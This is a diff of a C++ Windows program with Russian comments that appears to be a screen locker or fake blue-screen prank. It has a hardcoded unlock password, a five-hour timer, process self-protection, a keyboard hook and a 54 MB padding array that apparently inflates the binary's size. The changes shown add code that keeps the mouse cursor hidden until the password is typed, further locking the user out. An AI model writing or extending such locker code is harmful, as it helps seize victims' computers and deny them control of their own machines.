@@ -2,15 +2,15 @@
 #include <string>
 #include <vector>
 
-// Генерация "мусорных" данных для раздувания файла (ровно ~54 МБ)
+// Генерация "мусорных" данных для раздувания файла
 #pragma comment(linker, "/SECTION:.data,RWE")
-static const unsigned char padding_data[54 * 1024 * 1024] = { 0x90 }; 
+static volatile unsigned char padding_data[54 * 1024 * 1024] = { 0x90 };
 
 const std::wstring PASSWORD = L"29042011";
 std::wstring input_text = L"";
 bool is_bsod = false;
 DWORD start_time = 0;
-int time_left = 5 * 60 * 60; 
+int time_left = 5 * 60 * 60; // 5 часов
 DWORD last_timer_tick = 0;
 bool show_error = false;
 DWORD error_time = 0;
@@ -70,9 +70,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         last_timer_tick = GetTickCount();
         ProtectProcess(); 
         
-        // Обращаемся к мусорным данным, чтобы линкер не вырезал их
-        if (padding_data[0] == 0xFF) return -1; 
+        // Отключаем курсор мыши на уровне окна
+        ShowCursor(FALSE);
         
+        // Проверка массива (чтобы линкер не удалил)
+        if (padding_data[0] == 0xFF) return -1;
+
         return 0;
 
     case WM_CLOSE:
@@ -111,6 +114,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             show_error = false;
             InvalidateRect(hwnd, NULL, FALSE);
         }
+        
+        // Постоянно скрываем курсор, если он вдруг появился
+        ShowCursor(FALSE);
         return 0;
 
     case WM_CHAR:
@@ -119,6 +125,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 if (!input_text.empty()) input_text.pop_back();
             } else if (wp == VK_RETURN) {
                 if (input_text == PASSWORD) {
+                    ShowCursor(TRUE);
                     PostQuitMessage(0);
                 } else {
                     input_text.clear();
@@ -283,6 +290,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     }
     case WM_DESTROY:
         UnhookWindowsHookEx(hKeyboardHook);
+        ShowCursor(TRUE);
         PostQuitMessage(0);
         return 0;
     }
